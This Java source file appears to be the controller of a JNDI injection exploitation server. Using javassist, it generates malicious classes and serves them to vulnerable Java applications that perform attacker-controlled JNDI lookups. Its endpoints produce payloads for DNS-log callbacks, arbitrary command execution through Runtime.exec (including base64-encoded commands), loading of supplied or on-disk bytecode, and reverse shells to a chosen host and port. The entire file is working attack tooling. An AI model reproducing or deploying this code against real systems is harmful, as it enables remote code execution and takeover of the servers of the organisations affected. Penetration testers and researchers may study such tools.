package map.jndi.controller;

import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.bean.ClassBean;
import map.jndi.server.WebServer;
import map.jndi.template.ReverseShellTemplate;
import map.jndi.util.MiscUtil;
import map.jndi.util.ReflectUtil;
import javassist.*;
import javassist.bytecode.AccessFlag;
import javassist.bytecode.ClassFile;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

@JNDIController
@JNDIMapping("/Basic")
public class BasicController implements Controller {
    public Object process(ClassBean classBean) {
        WebServer.serveFile("/" + classBean.getName() + ".class", classBean.getData());
        return classBean.getName();
    }

    @JNDIMapping("/DnsLog/{url}")
    public ClassBean dnsLog(String url) throws Exception {
        String className = MiscUtil.getRandStr(12);

        if (!url.startsWith("http://")) {
            url = "http://" + url;
        }

        ClassPool pool = ClassPool.getDefault();
        ClassFile classFile = new ClassFile(false, className, null);
        classFile.setMajorVersion(ClassFile.JAVA_8);
        classFile.setAccessFlags(AccessFlag.PUBLIC);
        CtClass clazz = pool.makeClass(classFile);

        String body = String.format("new java.net.URL(\"%s\").hashCode();", url);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setModifiers(Modifier.PUBLIC);
        constructor.setBody(body);
        clazz.addConstructor(constructor);

        System.out.println("DnsLog: " + url);
        return new ClassBean(className, clazz.toBytecode());
    }

    @JNDIMapping("/Command/{cmd}")
    public ClassBean command(String cmd) throws Exception {
        String className = MiscUtil.getRandStr(12);

        ClassPool pool = ClassPool.getDefault();
        ClassFile classFile = new ClassFile(false, className, null);
        classFile.setMajorVersion(ClassFile.JAVA_8);
        classFile.setAccessFlags(AccessFlag.PUBLIC);
        CtClass clazz = pool.makeClass(classFile);

        String body = String.format("java.lang.Runtime.getRuntime().exec(\"%s\");", cmd);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setModifiers(Modifier.PUBLIC);
        constructor.setBody(body);
        clazz.addConstructor(constructor);

        System.out.println("Cmd: " + cmd);
        return new ClassBean(className, clazz.toBytecode());
    }

    @JNDIMapping("/Command/Base64/{cmd}")
    public ClassBean base64Command(String cmd) throws Exception {
        cmd = new String(Base64.getUrlDecoder().decode(cmd));
        return this.command(cmd);
    }

    @JNDIMapping("/FromCode/{code}")
    public ClassBean fromCode(String code) throws Exception {
        String className = MiscUtil.getRandStr(12);
        byte[] byteCode = Base64.getUrlDecoder().decode(code);

        ClassPool pool = ClassPool.getDefault();
        ClassFile classFile = new ClassFile(new DataInputStream(new ByteArrayInputStream(byteCode)));
        classFile.setMajorVersion(ClassFile.JAVA_8);
        classFile.setAccessFlags(AccessFlag.PUBLIC);
        CtClass clazz = pool.makeClass(classFile);
        clazz.replaceClassName(clazz.getName(), className);

        System.out.println("FromCode ClassName: " + clazz.getName() + " Length: " + byteCode.length);
        return new ClassBean(className, clazz.toBytecode());
    }

    @JNDIMapping("/FromPath/{path}")
    public ClassBean fromPath(String path) throws Exception {
        String className = MiscUtil.getRandStr(12);
        path = new String(Base64.getUrlDecoder().decode(path));
        byte[] data = Files.readAllBytes(Paths.get(path));

        ClassPool pool = ClassPool.getDefault();
        ClassFile classFile = new ClassFile(new DataInputStream(new ByteArrayInputStream(data)));
        classFile.setMajorVersion(ClassFile.JAVA_8);
        classFile.setAccessFlags(AccessFlag.PUBLIC);
        CtClass clazz = pool.makeClass(classFile);
        clazz.replaceClassName(clazz.getName(), className);

        System.out.println("FromPath ClassName: " + clazz.getName() + " Path: " + path + " Length: " + data.length);
        return new ClassBean(className, clazz.toBytecode());
    }

    @JNDIMapping("/ReverseShell/{host}/{port}")
    public ClassBean reverseShell(String host, String port) throws Exception {
        String className = MiscUtil.getRandStr(12);

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(ReverseShellTemplate.class.getName());
        clazz.replaceClassName(clazz.getName(), className);

        ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
        ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(Integer.parseInt(port)));

        System.out.println("ReverseShell ClassName: " + clazz.getName() + " Host: " + host + " Port: " + port);
        return new ClassBean(className, clazz.toBytecode());
    }
}
